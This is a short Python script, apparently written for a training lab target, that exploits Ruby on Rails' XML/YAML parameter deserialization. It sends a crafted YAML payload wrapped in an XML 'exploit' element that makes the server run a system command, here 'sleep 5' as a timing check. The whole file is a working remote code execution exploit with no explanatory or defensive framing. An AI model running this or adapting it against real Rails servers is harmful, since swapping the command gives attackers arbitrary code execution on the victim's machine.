#https://gist.github.com/postmodern/4499206
import sys
import requests
import html


def main():
    url = "http://ptl-3c27d3cb-b4a3a61a.libcurl.so/"
    
    header = {
        'Content-Type': 'text/xml',
        'X-HTTP-Method-Override': 'get'
    }

    yaml = '''
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
    foo
    (system('sleep 5'); @executed = true) unless @executed
    __END__
: !ruby/struct
    defaults:
        :action: create
        :controller: foos
    required_parts: []
    requirements:
        :action: create
        :controller: foos
    segment_keys:
        - :format</exploit>
    '''

    data = '''
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">{}</exploit>
    '''.format(html.escape(yaml))

    
    print(data)
    try:
        response = requests.post(url, headers=header, data=data)
        if response.status_code == 200:
            print("Code 200 OK")
        else:
            print("Failed to send request. Status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    main()

